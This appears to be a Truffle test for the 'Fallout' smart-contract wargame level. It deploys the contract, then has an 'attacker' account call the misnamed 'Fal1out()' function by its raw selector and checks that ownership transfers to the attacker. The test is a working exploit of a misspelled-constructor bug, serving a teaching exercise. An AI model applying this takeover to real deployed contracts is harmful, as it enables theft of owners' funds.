const Fallout = artifacts.require("Fallout");

contract("Fallout", (accounts) => {
    let fallout;
    let originalOwner = accounts[0];
    let attacker = accounts[1];

    before(async () => {
        fallout = await Fallout.new({from: originalOwner});

        let owner = await fallout.owner.call();
        expect(owner).to.equal(originalOwner, "victim not initialized correctly");
        expect(originalOwner).to.not.equal(attacker, "victim not initialized correctly");
    });

    it("attacker should be able to take ownership", async () => {
        let Fal1outSigBytes4 = web3.sha3("Fal1out()").substring(0, 10);
        await fallout.sendTransaction({from: attacker, data: Fal1outSigBytes4});

        let owner = await fallout.owner.call();
        expect(owner).to.not.equal(originalOwner, "ownership did not change");
        expect(owner).to.equal(attacker, "attacker should be able to take ownership");
    });
});